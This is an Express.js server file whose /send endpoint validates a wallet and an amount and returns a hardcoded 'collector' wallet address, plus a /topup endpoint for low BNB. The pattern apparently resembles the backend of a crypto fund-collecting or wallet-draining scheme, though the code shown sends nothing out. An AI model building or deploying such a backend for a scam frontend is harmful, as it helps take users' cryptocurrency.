// server.js
import express from "express";
import cors from "cors";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static("public")); // Serve frontend

// Collector wallet (set in .env)
const COLLECTOR = process.env.COLLECTOR || "0x5681d680B047bF5b12939625C56301556991005e";

// --- POST /send --- 
app.post("/send", (req, res) => {
  const { wallet, amount } = req.body;

  if (!wallet || !amount) {
    return res.status(400).json({
      ok: false,
      found: false,
      message: "Wallet or amount missing",
    });
  }

  // Validate wallet format
  if (!/^0x[a-fA-F0-9]{40}$/.test(wallet)) {
    return res.status(400).json({
      ok: false,
      found: false,
      message: "Invalid wallet address",
    });
  }

  // Validate amount
  const amountNum = Number(amount);
  if (isNaN(amountNum) || amountNum <= 0) {
    return res.status(400).json({
      ok: false,
      found: false,
      message: "Invalid amount",
    });
  }

  // ✅ Success response
  return res.json({
    ok: true,
    found: true,
    amountHuman: amountNum,
    collector: COLLECTOR,
  });
});

// --- Optional /topup endpoint for low BNB --- 
app.post("/topup", (req, res) => {
  const { to } = req.body;
  if (!to) return res.status(400).json({ ok: false, message: "Recipient missing" });
  return res.json({ ok: true, message: `Topup request received for ${to}` });
});

// --- Start server ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
